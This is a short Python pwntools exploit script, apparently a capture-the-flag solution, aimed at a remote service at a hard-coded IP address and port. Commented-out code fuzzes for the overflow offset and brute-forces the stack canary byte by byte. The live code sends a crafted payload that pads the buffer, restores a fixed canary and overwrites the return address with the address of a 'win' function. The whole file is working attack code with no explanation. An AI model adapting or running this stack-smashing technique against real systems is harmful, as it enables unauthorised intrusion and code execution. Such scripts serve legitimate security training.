from pwn import *

def recv_all(p:remote):
    for _ in (range(10)):
        print(p.recvline(timeout=0.1))

# Open program
# p = remote("51.15.171.241", 9007)
# p:remote = remote("localhost", 9000)

# # While connection is open
# i = 64
# try:
#     while True:
#         buf = b'A' * i
#         p.sendline(buf)
#         print('\r\rIndex: ' + str(i), end='')
#         p.recvline(timeout=1)
#         i+=4
# except:
#     print("End of connection at index: " + str(i))

context.log_level = 'error'

# cannaries = [0]
# while True:
#         p = remote("51.15.171.241", 9007)
#         buf = b' ' * 85
#         for i in range(len(cannaries)):
#             buf += p8(cannaries[i])

#         p.sendline(buf)

#         s = p.recvuntil(b"stack smashing detected")

#         if (s != ''):
#             cannaries[-1] += 1
#             print("can: " + str(cannaries))
#             continue
        
#         print("Canary: " + str(cannaries[-1]))
#         print(s)
#         cannaries.append(0)
#         p.close()


coin_coin = b'\x00\xf2\x0c\xb5'
win_addr = p32(0x080493f8) # = \xf8\x93\x04\x08

p = remote("51.15.171.241", 9007)
buf = b'end' + b'A' * 61 + coin_coin + b"A" * 12 + win_addr
p.send(buf)

print(p.recvline(timeout=1))
print(p.recvline(timeout=1))
print(p.recvline(timeout=1))
print(p.recvline(timeout=1))
print(p.recvline(timeout=1))

p.close()
